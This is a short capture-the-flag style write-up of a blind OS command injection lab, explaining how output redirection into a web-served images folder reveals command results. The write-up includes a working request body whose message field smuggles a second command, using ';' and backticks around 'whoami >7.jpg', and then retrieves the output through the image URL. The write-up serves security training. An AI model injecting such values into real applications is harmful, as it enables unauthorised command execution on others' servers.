# Lab: Blind OS command injection with output redirection

>This lab contains a blind OS command injection vulnerability in the feedback function.

>The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

>/var/www/images/

>The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

>To solve the lab, execute the whoami command and retrieve the output.


### Vulnerable area
`POST /feedback/submit`

### Redirecting output
We are told that we can write to `/var/www/images`, we can do this with the redirect operator `>`. We can then read the output by navigating to that file. I will try to write and read to `image?filename=7.jpg`

### Exploit
Modified the request body of the vulnerable area to the following:

<pre>csrf=DFWIAowwJt6vpLCyaD3niQRxCVPFBaMX&name=niko&email=niko%40mail.com&subject=mad&message=mad;`whoami >7.jpg`</pre>

Use command separator `;` to execute whoami and then overwrote `7.jpg` to contain the output of the `whoami` command

Now open the image and see the response `GET /image?filename=7.jpg HTTP/1.1`

Response is `peter-9HX3hb`

Lab solved!